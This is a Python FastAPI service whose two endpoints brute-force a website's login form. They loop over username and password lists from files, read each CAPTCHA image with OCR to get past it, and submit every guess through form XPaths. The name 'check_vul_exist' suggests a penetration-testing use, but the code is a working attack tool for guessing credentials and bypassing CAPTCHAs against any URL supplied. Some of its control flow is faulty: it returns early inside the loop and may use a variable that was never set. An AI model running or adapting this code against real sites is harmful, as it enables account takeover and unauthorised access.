from fastapi import FastAPI
from api.models.data_structure import User, UserPass
from captcha_solver.data_sender import DataSender
from captcha_solver.file_reader import FileReader
from captcha_solver.image_processing import DSP
from captcha_solver.easyocr_implement import MyEasyOCR
from captcha_solver.mongodb_config import MongoDBConfiguration
from captcha_solver.logger import Logger
from api.core.exception_handler import ExceptionHandler

app = FastAPI()


@app.post("/user-bruteforce/", tags=["user-login-brute-force"])
async def user_bruteforce(data: User):
    data_dict = data.dict()
    user_file = FileReader(data_dict["user_input_file"])
    data_sender = DataSender(data_dict["url"])
    # conf = MongoDBConfiguration()
    # logger = Logger(conf.mongodb_config)
    # coll = logger.mongodb_collection(logger.mongodb_database("login_brute_force"), "user_bruteforce")

    for user in user_file.text_reader():
        if data_sender.captcha_error(data_dict["captcha_error_xpath"]) == 429:
            data_sender.captcha_downloader(data_dict["captcha_image_name"])
            dsp = DSP()
            image = dsp.image_editor(dsp.get_color[0]["start"], dsp.get_color[0]["end"])
            captcha_data = MyEasyOCR(image, data_dict["gpu_mode"], data_dict["captcha_language"])
            data_sender.captcha_sender(data_dict["captcha_xpath"], captcha_data.easy_result)
            data_sender.clear_xpath(data_dict["user_xpath"])
            data_sender.user_sender(data_dict["user_xpath"], user)
            data_sender.submit(data_dict["submit_xpath"])
            status = data_sender.check_vul_exist()
            handler = ExceptionHandler(status)
            # logger.mongodb_insert_one(coll, {handler: status})
            return handler.exception_sender

        elif data_sender.user_error(data_dict["user_error_xpath"]) == 401:
            handler = ExceptionHandler(401)
            # logger.mongodb_insert_one(coll, {handler: 401})

        data_sender.captcha_downloader(data_dict["captcha_image_name"])
        dsp = DSP()
        image = dsp.image_editor2(dsp.get_color)
        captcha_data = MyEasyOCR(image, data_dict["gpu_mode"], data_dict["captcha_language"])
        data_sender.captcha_sender(data_dict["captcha_xpath"], captcha_data.easy_result)
        data_sender.clear_xpath(data_dict["user_xpath"])
        data_sender.user_sender(data_dict["user_xpath"], user)
        data_sender.submit(data_dict["submit_xpath"])
        status = data_sender.check_vul_exist()
        handler = ExceptionHandler(status)
        # logger.mongodb_insert_one(coll, {handler: status})
    if data_sender.captcha_error(data_dict["captcha_error_xpath"]):
        data_sender.captcha_downloader(data_dict["captcha_image_name"])
        dsp = DSP()
        image = dsp.image_editor2(dsp.get_color)
        captcha_data = MyEasyOCR(image, data_dict["gpu_mode"], data_dict["captcha_language"])
        data_sender.captcha_sender(data_dict["captcha_xpath"], captcha_data.easy_result)
        data_sender.clear_xpath(data_dict["user_xpath"])
        data_sender.user_sender(data_dict["user_xpath"], user_file.text_reader()[-1])
        data_sender.submit(data_dict["submit_xpath"])
        status = data_sender.check_vul_exist()
        handler = ExceptionHandler(status)
        # logger.mongodb_insert_one(coll, {handler: status})
    return handler.exception_sender


@app.post("/user-pass-bruteforce/", tags=["userpass-login-brute-force"])
async def userpass_bruteforce(data: UserPass):
    data_dict = data.dict()
    user_file = FileReader(data_dict["user_input_file"])
    password_file = FileReader(data_dict["password_input_file"])
    data_sender = DataSender(data_dict["url"])
    # conf = MongoDBConfiguration()
    # logger = Logger(conf.mongodb_config)
    # coll = logger.mongodb_collection(logger.mongodb_database("login_brute_force"), "userpass_bruteforce")
    for user in user_file.text_reader():
        for password in password_file.text_reader():
            if data_sender.captcha_error(data_dict["captcha_error_xpath"]) == 429:
                data_sender.captcha_downloader(data_dict["captcha_image_name"])
                dsp = DSP()
                image = dsp.image_editor2(dsp.get_color)
                captcha_data = MyEasyOCR(image, data_dict["gpu_mode"], data_dict["captcha_language"])
                data_sender.captcha_sender(data_dict["captcha_xpath"], captcha_data.easy_result)
                data_sender.clear_xpath(data_dict["user_xpath"])
                data_sender.user_sender(data_dict["user_xpath"], user)
                data_sender.password_sender(data_dict["password_xpath"], password)
                data_sender.submit(data_dict["submit_xpath"])
                status = data_sender.check_vul_exist()
                handler = ExceptionHandler(status)
                # logger.mongodb_insert_one(coll, {handler: status})
            elif data_sender.user_error(data_dict["user_error_xpath"]) == 401:
                handler = ExceptionHandler(401)
                # logger.mongodb_insert_one(coll, {handler: 401})

            data_sender.captcha_downloader(data_dict["captcha_image_name"])
            dsp = DSP()
            image = dsp.image_editor2(dsp.get_color)
            captcha_data = MyEasyOCR(image, data_dict["gpu_mode"], data_dict["captcha_language"])
            data_sender.captcha_sender(data_dict["captcha_xpath"], captcha_data.easy_result)
            data_sender.clear_xpath(data_dict["user_xpath"])
            data_sender.user_sender(data_dict["user_xpath"], user)
            data_sender.password_sender(data_dict["password_xpath"], password)
            data_sender.submit(data_dict["submit_xpath"])
            status = data_sender.check_vul_exist()
            handler = ExceptionHandler(status)
            # logger.mongodb_insert_one(coll, {handler: status})
    if data_sender.captcha_error(data_dict["captcha_error_xpath"]):
        data_sender.captcha_downloader(data_dict["captcha_image_name"])
        dsp = DSP()
        image = dsp.image_editor2(dsp.get_color)
        captcha_data = MyEasyOCR(image, data_dict["gpu_mode"], data_dict["captcha_language"])
        data_sender.captcha_sender(data_dict["captcha_xpath"], captcha_data.easy_result)
        data_sender.clear_xpath(data_dict["user_xpath"])
        data_sender.user_sender(data_dict["user_xpath"], user_file.text_reader()[-1])
        data_sender.password_sender(data_dict["password_xpath"], password_file.text_reader()[-1])
        data_sender.submit(data_dict["submit_xpath"])
        status = data_sender.check_vul_exist()
        handler = ExceptionHandler(status)
        # logger.mongodb_insert_one(coll, {handler: status})
    return handler.exception_sender
